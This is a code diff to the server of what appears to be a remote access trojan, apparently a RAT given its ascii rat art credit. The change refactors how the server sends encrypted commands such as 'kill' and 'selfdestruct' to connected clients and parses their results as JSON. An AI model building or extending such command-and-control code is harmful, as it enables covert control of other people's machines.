@@ -13,9 +13,10 @@ import sys
 import threading
 
 from core.crypto import encrypt, decrypt, diffiehellman
+from core.transport import server_to_client, json2dict, dict2json
 
+from __init__ import __version__
 
-__version__ = '0.3'
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
@@ -72,17 +73,22 @@ class Server(threading.Thread):
             self.clients[client_id] = client
             self.client_count += 1
 
-    def send_client(self, message, client):
+    def send_client(self, cmd, action, client):
         try:
-            enc_message = encrypt(message, client.dhkey)
-            client.conn.send(enc_message)
+            data = server_to_client(cmd, action)
+            data = dict2json(data)
+            enc_data = encrypt(data, client.dhkey)
+            client.conn.send(enc_data)
         except Exception as e:
             print('Error: {}'.format(e))
 
     def recv_client(self, client):
         try:
             recv_data = client.conn.recv(4096)
-            print(decrypt(recv_data, client.dhkey))
+            recv_data = decrypt(recv_data, client.dhkey)
+            recv_data = json2dict(recv_data)
+            recv_data = recv_data['results']
+            print(recv_data)
         except Exception as e:
             print('Error: {}'.format(e))
 
@@ -97,13 +103,13 @@ class Server(threading.Thread):
         return self.clients.pop(key, None)
 
     def kill_client(self, _):
-        self.send_client('kill', self.current_client)
+        self.send_client('kill', '', self.current_client)
         self.current_client.conn.close()
         self.remove_client(self.current_client.uid)
         self.current_client = None
 
     def selfdestruct_client(self, _):
-        self.send_client('selfdestruct', self.current_client)
+        self.send_client('selfdestruct', '', self.current_client)
         self.current_client.conn.close()
         self.remove_client(self.current_client.uid)
         self.current_client = None
@@ -220,7 +226,7 @@ def main():
         elif cmd in CLIENT_COMMANDS:
             if ccid != '?':
                 print('Running {}...'.format(cmd))
-                server.send_client(prompt, server.current_client)
+                server.send_client(cmd, action, server.current_client)
                 server.recv_client(server.current_client)
             else:
                 print('Error: No client selected.')
